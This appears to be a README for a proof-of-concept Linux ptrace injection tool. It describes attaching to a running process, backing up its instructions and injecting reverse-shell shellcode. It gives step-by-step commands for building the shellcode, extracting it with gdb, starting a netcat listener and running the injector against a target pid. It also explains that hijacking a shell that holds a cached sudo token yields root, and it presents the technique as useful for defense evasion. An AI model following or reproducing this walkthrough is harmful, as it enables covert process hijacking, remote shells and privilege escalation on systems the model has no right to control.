# ptrace_injection
Proof of concept code to use ptrace on Linux systems for injecting code in an existing process. It attaches to the given pid, halts it's execuation, backs up current instructions, injects shellcode (which forks a child process) and resumes the execution from the backed up instructions.

### Usage

- Compile shell code

```
as reverse_shell.s -o reverse_shell.o
ld reverse_shell.o -o reverse_shell
```
- Get the shellcode with gdb

```
gdb ./reverse_shellcode

(gdb) x/185bx _start+0

```
- Modify shellcode in `ptrace_injection.c` and compile

```
gcc ptrace_injection.c -o ptrace_injection
```
- Setup reverse shell listener and run against a target pid

```
nc -lvp 4444
```

```
./ptrace_injection 1234
```


### Details

Linux comes with an interesting system call `ptrace` which can be abused to elevate privileges and steal sensitive information. It provides a means by which one process (the "tracer") may observe and control the execution of another process (the "tracee"), and examine and change the tracee's memory and registers.

With `ptrace` we can write data into the process effectively achieving the ability to inject code into an existing process. This can be very handy for defense evasion and potentially achieve privilege escalation. 

By default many distributions have sudo caching enabled. When a shell process invokes sudo, system caches the password in the form of a token which is valid for certain amount of time so password is not required for any further sudo commands invoked by the same shell until the timer expires. By injecting our shell-code into such shell process, we can effectively become root.
